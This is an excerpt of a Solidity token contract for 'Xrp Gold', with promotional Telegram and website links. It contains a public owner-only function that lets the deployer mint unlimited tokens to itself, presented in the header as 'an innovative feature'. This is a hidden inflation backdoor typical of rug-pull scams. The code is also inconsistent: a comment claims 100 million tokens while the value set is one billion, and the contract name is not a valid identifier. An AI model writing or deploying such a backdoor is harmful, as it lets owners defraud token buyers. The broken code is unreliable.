//
// $XrpGold proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/XrpGoldOFC
// 📱 Website ::https://xrpgold.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _XrpGold(uint256 amount) public onlyOwner {
 _XrpGold(msg.sender, amount);
    }
    ...
    function _XrpGold(address account, uint256 amount) internal virtual {
...
contract $XrpGold is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Xrp Gold", "XRPGOLD") {
     _XrpGold(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}